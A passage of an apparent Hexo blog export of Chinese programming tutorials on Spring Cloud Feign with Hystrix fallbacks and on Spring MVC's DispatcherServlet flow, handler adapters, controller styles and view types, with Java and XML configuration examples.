class="name">groupId</span>&gt;</span>com.netflix.feign<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>feign-jackson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">version</span>&gt;</span>8.18.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">		.............</span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>注意到我们只有两个依赖，分别是注册中心和<code>feign</code>的依赖，那么<code>Ribbon</code>和<code>Hystrix</code>的依赖在哪里呢？</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/08/25/ogwCnTH7KeXFBrA.png"
                      alt="image.png"
                ></p>
<p>可以很清楚的看到，Feign已经集成了Ribbon和Hystrix的依赖。</p>
<h2 id="注册中心"><a href="#注册中心" class="headerlink" title="注册中心"></a>注册中心</h2><p>这里使用Nacos作为注册中心</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/08/25/BcTxMVdQYusfXID.png"
                      alt="image.png"
                ></p>
<h2 id="服务提供方"><a href="#服务提供方" class="headerlink" title="服务提供方"></a>服务提供方</h2><p>事实上，每个微服务都可以被认为是生产者和消费者。</p>
<p>我们单从一条线去完成整体的调用</p>
<p>提供方仅仅完成简单的查询操作：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/liduoan_order&quot;)</span></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OrderController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> OrderService orderService;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/findOrderByUserId/&#123;userId&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> R <span class="title function_">findOrderByUserId</span><span class="params">(<span class="meta">@PathVariable(&quot;userId&quot;)</span> Integer userId)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 线程随机0-2000毫秒休眠</span></span><br><span class="line">            Thread.sleep(<span class="keyword">new</span> <span class="title class_">Random</span>().nextInt(<span class="number">2000</span>));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        log.info(<span class="string">&quot;根据userId:&quot;</span>+userId+<span class="string">&quot;查询订单信息&quot;</span>);</span><br><span class="line">        List&lt;OrderEntity&gt; orderEntities = orderService.listByUserId(userId);</span><br><span class="line">        <span class="keyword">return</span> R.ok().put(<span class="string">&quot;orders&quot;</span>, orderEntities);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意到我有一个线程休眠处理，这里是为了测试Hystrix的降级功能。</p>
<h2 id="服务调用方"><a href="#服务调用方" class="headerlink" title="服务调用方"></a>服务调用方</h2><p>先看整体包组成：</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/08/25/HSOa1TmRgGBMwqC.png"
                      alt="image.png"
                ></p>
<p>主要有Feign，Hystrix的FallBack，对应的Controller。</p>
<p>先看Feign</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@FeignClient(value = &quot;liduoan-order&quot;, path = &quot;/liduoan_order&quot;</span></span><br><span class="line"><span class="meta">,fallback = OrderFallBack.class)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">OrderFeignService</span> &#123;</span><br><span class="line">	<span class="comment">//服务调用</span></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/findOrderByUserId/&#123;userId&#125;&quot;)</span></span><br><span class="line">    R <span class="title function_">findOrderByUserId</span><span class="params">(<span class="meta">@PathVariable(&quot;userId&quot;)</span> Integer userId)</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>那么看Controller，Controller有单纯的测试是否调用成功的UserController和Hystrix测试降级能力的TestController：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/user&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    OrderFeignService orderFeignService;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/findOrderByUserId/&#123;id&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> R <span class="title function_">findOrderByUserId</span><span class="params">(<span class="meta">@PathVariable(&quot;id&quot;)</span> Integer id)</span> &#123;</span><br><span class="line">        <span class="comment">//feign调用</span></span><br><span class="line">        <span class="type">R</span> <span class="variable">result</span> <span class="operator">=</span> orderFeignService.findOrderByUserId(id);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestController</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    OrderFeignService orderFeignService;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/test&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> ArrayList&lt;R&gt; <span class="title function_">test</span><span class="params">()</span>&#123;</span><br><span class="line">        ArrayList&lt;R&gt; pages = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)&#123;</span><br><span class="line">            <span class="type">R</span> <span class="variable">orderByUserId</span> <span class="operator">=</span> orderFeignService.findOrderByUserId(<span class="number">1</span>);</span><br><span class="line">            <span class="comment">// System.out.println(R);</span></span><br><span class="line">            pages.add(orderByUserId);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> pages;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后看一下对应的<code>OrderFallBack</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OrderFallBack</span> <span class="keyword">implements</span> <span class="title class_">OrderFeignService</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> R <span class="title function_">findOrderByUserId</span><span class="params">(Integer userId)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> R.error(userId + <span class="string">&quot;请求异常，请重试！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>参考文档：</p>
<p>Ribbon:</p>
<p><a class="link"   href="https://note.youdao.com/ynoteshare1/index.html?id=983c803c0f366af153e5c336aa4ac834&type=note" >https://note.youdao.com/ynoteshare1/index.html?id=983c803c0f366af153e5c336aa4ac834&amp;type=note<i class="fas fa-external-link-alt"></i></a></p>
<p>Feign:</p>
<p><a class="link"   href="https://liduoan.github.io/2021/05/07/Spring-%E7%A9%B6%E6%9E%81%E8%A7%A3%E6%9E%90/#more" >https://liduoan.github.io/2021/05/07/Spring-%E7%A9%B6%E6%9E%81%E8%A7%A3%E6%9E%90/#more<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://note.youdao.com/ynoteshare1/index.html?id=e4d3a42acab8240647293dde5ed88b7b&type=note" >https://note.youdao.com/ynoteshare1/index.html?id=e4d3a42acab8240647293dde5ed88b7b&amp;type=note<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://blog.csdn.net/forezp/article/details/73480304" >https://blog.csdn.net/forezp/article/details/73480304<i class="fas fa-external-link-alt"></i></a></p>
<p>Hystrix:</p>
<p><a class="link"   href="https://segmentfault.com/a/1190000005988895" >https://segmentfault.com/a/1190000005988895<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://www.bilibili.com/video/BV1V4411F7my?p=2" >https://www.bilibili.com/video/BV1V4411F7my?p=2<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
      <tags>
        <tag>2021</tag>
      </tags>
  </entry>
  <entry>
    <title>SpringMvc</title>
    <url>/2021/03/28/2021/SpringMvc/</url>
    <content><![CDATA[<span id="more"></span>

<h1 id="1、什么是MVC"><a href="#1、什么是MVC" class="headerlink" title="1、什么是MVC"></a>1、什么是MVC</h1><ul>
<li>MVC是模型(Model)、视图(View)、控制器(Controller)的简写，是一种软件设计规范。</li>
<li>是将业务逻辑、数据、显示分离的方法来组织代码。</li>
<li>MVC主要作用是<strong>降低了视图与业务逻辑间的双向偶合</strong>。</li>
<li>MVC不是一种设计模式，<strong>MVC是一种架构模式</strong>。当然不同的MVC存在差异。</li>
</ul>
<p><strong>Model（模型）：</strong>数据模型，提供要展示的数据，因此包含数据和行为，可以认为是领域模型或JavaBean组件（包含数据和行为），不过现在一般都分离开来：Value Object（数据Dao） 和 服务层（行为Service）。也就是模型提供了模型数据查询和模型数据的状态更新等功能，包括数据和业务。</p>
<p><strong>View（视图）：</strong>负责进行模型的展示，一般就是我们见到的用户界面，客户想看到的东西。</p>
<p><strong>Controller（控制器）：</strong>接收用户请求，委托给模型进行处理（状态改变），处理完毕后把返回的模型数据返回给视图，由视图负责展示。也就是说控制器做了个调度员的工作。</p>
<p><strong>最典型的MVC就是JSP + servlet + javabean的模式。</strong></p>
<h1 id="2、什么是SpringMVC"><a href="#2、什么是SpringMVC" class="headerlink" title="2、什么是SpringMVC"></a>2、什么是SpringMVC</h1><h2 id="2-1、概述"><a href="#2-1、概述" class="headerlink" title="2.1、概述"></a>2.1、概述</h2><p>Spring MVC是Spring Framework的一部分，是基于Java实现MVC的轻量级Web框架。</p>
<p>查看官方文档：</p>
<p><a class="link"   href="https://docs.spring.io/spring/docs/5.2.0.RELEASE/spring-framework-reference/web.html#spring-web" >https://docs.spring.io/spring/docs/5.2.0.RELEASE/spring-framework-reference/web.html#spring-web<i class="fas fa-external-link-alt"></i></a></p>
<p><strong>我们为什么要学习SpringMVC呢?</strong></p>
<p> Spring MVC的特点：</p>
<ol>
<li>轻量级，简单易学</li>
<li>高效 , 基于请求响应的MVC框架</li>
<li>与Spring兼容性好，无缝结合</li>
<li>约定优于配置</li>
<li>功能强大：RESTful、数据验证、格式化、本地化、主题等</li>
<li>简洁灵活</li>
</ol>
<p>Spring的web框架围绕<strong>DispatcherServlet</strong> [ 调度Servlet ] 设计。</p>
<p>DispatcherServlet的作用是将请求分发到不同的处理器。从Spring 2.5开始，使用Java 5或者以上版本的用户可以采用基于注解形式进行开发，十分简洁；</p>
<h3 id="2-2、中心控制器"><a href="#2-2、中心控制器" class="headerlink" title="2.2、中心控制器"></a>2.2、中心控制器</h3><p>Spring的web框架围绕DispatcherServlet设计。DispatcherServlet的作用是将请求分发到不同的处理器。从Spring 2.5开始，使用Java 5或者以上版本的用户可以采用基于注解的controller声明方式。</p>
<p>​	Spring MVC框架像许多其他MVC框架一样, <strong>以请求为驱动</strong> , <strong>围绕一个中心Servlet分派请求及提供其他功能</strong>，**DispatcherServlet是一个实际的Servlet (它继承自HttpServlet 基类)**。</p>
<p>SpringMVC的原理如下图所示：</p>
<p>​	当发起请求时被前置的控制器拦截到请求，根据请求参数生成代理请求，找到请求对应的实际控制器，控制器处理请求，创建数据模型，访问数据库，将模型响应给中心控制器，控制器使用模型与视图渲染视图结果，将结果返回给中心控制器，再将结果返回给请求者。</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/03/28/QxL7bMvnzH2iYSJ.jpg"
                      alt="Screenshot_10.jpg"
                ></p>
<h3 id="2-3、SpringMVC执行原理"><a href="#2-3、SpringMVC执行原理" class="headerlink" title="2.3、SpringMVC执行原理"></a>2.3、SpringMVC执行原理</h3><p>图为SpringMVC的一个较完整的流程图，实线表示SpringMVC框架提供的技术，不需要开发者实现，虚线表示需要开发者实现。</p>
<p><strong>简要分析执行流程</strong></p>
<ol>
<li><p>DispatcherServlet表示前置控制器，是整个SpringMVC的控制中心。用户发出请求，DispatcherServlet接收请求并拦截请求。</p>
<p>我们假设请求的url为 : <a class="link"   href="http://localhost:8080/SpringMVC/hello" >http://localhost:8080/SpringMVC/hello<i class="fas fa-external-link-alt"></i></a></p>
<p><strong>如上url拆分成三部分：</strong></p>
<p><a href="http://localhost:8080服务器域名">http://localhost:8080服务器域名</a></p>
<p>SpringMVC部署在服务器上的web站点</p>
<p>hello表示控制器</p>
<p>通过分析，如上url表示为：请求位于服务器localhost:8080上的SpringMVC站点的hello控制器。</p>
</li>
<li><p>HandlerMapping为处理器映射。DispatcherServlet调用HandlerMapping,HandlerMapping根据请求url查找Handler。</p>
</li>
<li><p>HandlerExecution表示具体的Handler,其主要作用是根据url查找控制器，如上url被查找控制器为：hello。</p>
</li>
<li><p>HandlerExecution将解析后的信息传递给DispatcherServlet,如解析控制器映射等。</p>
</li>
<li><p>HandlerAdapter表示处理器适配器，其按照特定的规则去执行Handler。</p>
</li>
<li><p>Handler让具体的Controller执行。</p>
</li>
<li><p>Controller将具体的执行信息返回给HandlerAdapter,如ModelAndView。</p>
</li>
<li><p>HandlerAdapter将视图逻辑名或模型传递给DispatcherServlet。</p>
</li>
<li><p>DispatcherServlet调用视图解析器(ViewResolver)来解析HandlerAdapter传递的逻辑视图名。</p>
</li>
<li><p>视图解析器将解析的逻辑视图名传给DispatcherServlet。</p>
</li>
<li><p>DispatcherServlet根据视图解析器解析的视图结果，调用具体的视图。</p>
</li>
<li><p>最终视图呈现给用户。</p>
</li>
</ol>
]]></content>
      <tags>
        <tag>2021</tag>
      </tags>
  </entry>
  <entry>
    <title>SpringMvc究极解析</title>
    <url>/2021/05/17/2021/SpringMvc%E7%A9%B6%E6%9E%81%E8%A7%A3%E6%9E%90/</url>
    <content><![CDATA[<span id="more"></span>

<h1 id="MVC模型"><a href="#MVC模型" class="headerlink" title="MVC模型"></a>MVC模型</h1><p>Model2 模型是在 Model1 的基础上进行改良，它是 MVC 模型的一个经典应用。它把处理请求和展示数据进行分离，让每个部分各司其职。</p>
<p>此时的 JSP 已经就是纯粹的展示数据了，而处理请求的事情交由控制器来完成，使</p>
<p>每个组件充分独立，提高了代码可重用性和易维护性。下图展示的就是 Model2 模型：</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/05/17/9seqNmAoOvpb8xd.jpg"
                      alt="Screenshot_81.jpg"
                ></p>
<p>Model 2是基于MVC架构的设计模式。</p>
<p>在Model 2架构中，Servlet作为前端控制器，负责接收客户端发送的请求</p>
<p>在Servlet中只包含控制逻辑和简单的前端处理；</p>
<p>后端JavaBean来完成实际的逻辑处理；</p>
<p>最后，转发到相应的JSP页面处理显示逻辑。</p>
<h1 id="SpringMvc执行流程"><a href="#SpringMvc执行流程" class="headerlink" title="SpringMvc执行流程"></a>SpringMvc执行流程</h1><h2 id="整体流程"><a href="#整体流程" class="headerlink" title="整体流程"></a>整体流程</h2><p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/05/17/29lEwkLb1PceMpy.jpg"
                      alt="Screenshot_83.jpg"
                ></p>
<p>整个MVC的处理其实就是解析出这个URL应该调用什么方法，最后放回结果给这个请求</p>
<p>那么我们研究的就是解析是怎么处理的</p>
<p>1）前端控制器DispatcherServlet 由框架提供</p>
<p>作用：接收请求，处理响应结果</p>
<p>2）处理器映射器HandlerMapping由框架提供</p>
<p>作用：根据请求URL，找到对应的Handler</p>
<p>3）处理器适配器HandlerAdapter由框架提供</p>
<p>作用：调用处理器（Handler|Controller）的方法</p>
<p>4）处理器Handler又名Controller,后端处理器</p>
<p>作用：接收用户请求数据，调用业务方法处理请求</p>
<p>5）视图解析器ViewResolver由框架提供</p>
<p>作用：视图解析，把逻辑视图名称解析成真正的物理视图</p>
<p>支持多种视图技术：JSTLView,FreeMarker…</p>
<p>6）视图View,程序员开发</p>
<p>作用：将数据展现给用户</p>
<p><strong>Tips:</strong></p>
<p>客户端发出请求，委托DispatcherServlet 处理，DispatcherServlet 交付给</p>
<p>HandlerMapping找到应该去找哪个HandlerAdapter。</p>
<p>HandlerAdapter调用处理器Handler（又名Controller）完成方法调用</p>
<p>然后封装ModelAndView返回给DispatcherServlet 。</p>
<p>DispatcherServlet 把ModelAndView交付给视图解析器ViewResolver完成视图解析。</p>
<p>最后返回View对象给DispatcherServlet ，他进行处理把视图交给客户端。</p>
<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><h3 id="前端控制器"><a href="#前端控制器" class="headerlink" title="前端控制器"></a>前端控制器</h3><p>前端控制器DispatcherServlet的配置在<code>web.xml</code>中：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>dispatcherServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.springframework.web.servlet.DispatcherServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>classpath:spring-mvc.xml<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>1<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>dispatcherServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="处理器映射器"><a href="#处理器映射器" class="headerlink" title="处理器映射器"></a>处理器映射器</h3><p>处理器映射器HandlerMapping是在 Spring 的 3.1 版本之后加入的。它的出现，可以让使用者更加轻松的去配置 SpringMVC 的请求路径映射。去掉了早期繁琐的 xml 的配置它的配置有两种方式，都是在<code>spring-mvc.xml</code>中加入配置。</p>
<p>方式一：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<p>方式二：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">mvc:annotation-driven</span>&gt;</span><span class="tag">&lt;/<span class="name">mvc:annotation-driven</span>&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>配置文件中的<code>mvc:annotation-driven</code>到底开启了什么？</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">&lt;!‐‐ HandlerMapping处理器映射器 ‐‐&gt; </span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.web.servlet.mvc.method.annotation.RequestMappin gHandlerMapping&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.web.servlet.handler.BeanNameUrlHandlerMapping&quot;</span>&gt;</span> <span class="tag">&lt;/<span class="name">bean</span>&gt;</span> </span><br><span class="line"></span><br><span class="line">&lt;!‐‐ HandlerAdapter处理器适配器 ‐‐&gt; </span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.web.servlet.mvc.method.annotation.RequestMappin gHandlerAdapter&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">bean</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.web.servlet.mvc.HttpRequestHandlerAdapter&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">bean</span>&gt;</span> </span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.web.servlet.mvc.SimpleControllerHandlerAdapter&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!‐‐ HadnlerExceptionResolvers ‐‐&gt; </span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.web.servlet.mvc.method.annotation.ExceptionHan dlerExceptionResolver&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.web.servlet.mvc.annotation.ResponseStatusExcep tionResolver&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">bean</span>&gt;</span> </span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.web.servlet.mvc.support.DefaultHandlerExceptio nResolver&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">bean</span>&gt;</span> </span><br></pre></td></tr></table></figure>
</blockquote>
<h3 id="处理器适配器"><a href="#处理器适配器" class="headerlink" title="处理器适配器"></a>处理器适配器</h3><p>处理器适配器HandlerAdapter，它之所以被成为适配器，是因为它可以把不同的控制器最终都看成是适配器类型，从而执行适配器中定义的方法。</p>
<p><strong>更深层次的是，我们可以把公共的功能都定义在适配器中，从而减少每种控制器中都有的重复性代码</strong>。</p>
<p>SpringMVC采用<strong>适配器模式</strong>来适配调用指定Handler，根据Handler的不同种类采用不同的HandlerAdapter，其中Handler与HandlerAdapter对应关系如下:</p>
<table>
<thead>
<tr>
<th>Handler类别</th>
<th>对应适配器</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>Controller</td>
<td>SimpleControllerHandlerAdapter</td>
<td>标准控制器，返回ModelAndView</td>
</tr>
<tr>
<td>HttpRequestHandler</td>
<td>HttpRequestHandlerAdapter</td>
<td>业务自行处理，请求不需要通过 ModelAndView转到视图</td>
</tr>
<tr>
<td>Servlet</td>
<td>SimpleServletHandlerAdapter</td>
<td>基于标准的Servlet处理</td>
</tr>
<tr>
<td>HandlerMethod</td>
<td>RequestMappingHandlerAdapter</td>
<td>基于@RequestMapping对应方法处理</td>
</tr>
</tbody></table>
<p>下面我们就看看处理器具体的三种实现方式。</p>
<h3 id="处理器的实现方式"><a href="#处理器的实现方式" class="headerlink" title="处理器的实现方式"></a>处理器的实现方式</h3><ul>
<li>方式一</li>
</ul>
<p>实现Controller接口，实现处理器：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloController</span> <span class="keyword">implements</span> <span class="title class_">Controller</span> &#123; </span><br><span class="line">    <span class="meta">@Override</span> </span><br><span class="line">    <span class="keyword">public</span> ModelAndView <span class="title function_">handleRequest</span><span class="params">(HttpServletRequest httpServletRequest, </span></span><br><span class="line"><span class="params">                                      HttpServletResponse httpServletResponse)</span> </span><br><span class="line">        							  <span class="keyword">throws</span> Exception &#123; </span><br><span class="line">        <span class="type">ModelAndView</span> <span class="variable">mv</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ModelAndView</span>(); </span><br><span class="line">        mv.setViewName(<span class="string">&quot;success&quot;</span>); </span><br><span class="line">        <span class="keyword">return</span> mv; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在<code>spring-mvc.xml</code>中加入配置：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;simpleControllerHandlerAdapter&quot;</span> </span></span><br><span class="line"><span class="tag">      <span class="attr">class</span>=<span class="string">&quot;org.springframework.web.servlet.mvc.SimpleControllerHandlerAdapter&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">name</span>=<span class="string">&quot;/sayhello&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.jimmy.controller.HelloController&quot;</span>&gt;</span> <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>方式二</li>
</ul>
<p>实现HttpRequestHandler接口，实现处理器：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloController</span> <span class="keyword">implements</span> <span class="title class_">HttpRequestHandler</span> &#123; </span><br><span class="line">    <span class="meta">@Override</span> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleRequest</span><span class="params">(HttpServletRequest request, </span></span><br><span class="line"><span class="params">                              HttpServletResponse respon se)</span> </span><br><span class="line">        					   <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        request.getRequestDispatcher(<span class="string">&quot;/WEB‐INF/pages/success.jsp&quot;</span>)</span><br><span class="line">               .forward(request,resp onse); </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在<code>spring-mvc.xml</code>中加入配置：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;httpRequestHandlerAdapter&quot;</span> </span></span><br><span class="line"><span class="tag">      <span class="attr">class</span>=<span class="string">&quot;org.springframework.web.servlet.mvc.HttpRequestHandlerAdapter&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span> </span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">name</span>=<span class="string">&quot;/sayhello&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.jimmy.controller.HelloController&quot;</span>&gt;</span> <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>这种方式和原始的Servlet方式非常相似。</p>
<ul>
<li>方式三</li>
</ul>
<p>我们使用的最多的方式，通过<code>@Controller</code>注解实现：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Controller</span> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloControler</span> &#123;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/hello&quot;)</span> </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;success&quot;</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在<code>spring-mvc.xml</code>中加入配置：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">&lt; bean id=&quot;requestMappingHandlerAdapter&quot; class= &quot;org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter&quot;/&gt;</span><br></pre></td></tr></table></figure>

<p>也可以直接配置：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">&lt;mvc:annotation‐driven&gt;&lt;/mvc:annotation‐driven&gt;</span><br></pre></td></tr></table></figure>

<h3 id="视图"><a href="#视图" class="headerlink" title="视图"></a>视图</h3><p>视图的作用是渲染模型数据，将模型里的数据以某种形式呈现给客户。为了实现视图模型和具体实现技术的解耦，Spring定 义了一个高度抽象的View接口。并且视图是无状态的，对于每一个请求，都会创建一个View对象，所以不会有线程安全的问题。在SpringMVC中常用的视图类型：</p>
<ul>
<li>URL视图<ul>
<li>InternalResourceView：将 JSP 或者其他资源封装成一个视图，是 InternaleResourceViewResolver默认使用的视图类型。</li>
<li>JstlView：它是当我们在页面中使用了 JSTL标签库的国际化标签后，需要采用的类型。</li>
</ul>
</li>
<li>文档类视图<ul>
<li>AbstractPdfView：PDF 文档视图的抽象类。</li>
<li>AbstarctXlsView：Excel文档视图的抽象类，该类是4.2版本后才有 。之前使用的是 AbstractExcelView。</li>
</ul>
</li>
<li>JSON视图<ul>
<li>MappingJackson2JsonView：将模型数据封装成Json格式数据输出，需要借助 Jackson开源框架。</li>
</ul>
